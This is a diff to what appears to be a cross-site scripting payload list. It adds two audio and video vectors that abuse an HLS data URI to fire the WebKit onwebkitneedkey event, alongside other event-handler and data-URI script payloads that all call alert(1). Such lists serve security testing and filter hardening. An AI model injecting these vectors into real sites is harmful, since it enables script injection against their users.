@@ -1027,6 +1027,8 @@ x<template shadowrootmode=open><slot onslotchange=alert(1)>
 <geolocation onpromptdismiss=alert(1)>
 <geolocation onpromptaction=alert(1)>
 <geolocation autolocate onlocation=alert(1)>
+<audio src=data:,%23EXTM3U%0A%23EXT-X-TARGETDURATION:1%0A%23EXT-X-KEY:METHOD=AES-128,URI=%22skd:%22%0A%23EXTINF:1%0Ax onwebkitneedkey=alert(1)></audio>
+<video src=data:,%23EXTM3U%0A%23EXT-X-TARGETDURATION:1%0A%23EXT-X-KEY:METHOD=AES-128,URI=%22skd:%22%0A%23EXTINF:1%0Ax onwebkitneedkey=alert(1)></video>
 <xss class=progress-bar-animated onanimationstart=alert(1)>
 <xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>
 <script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>
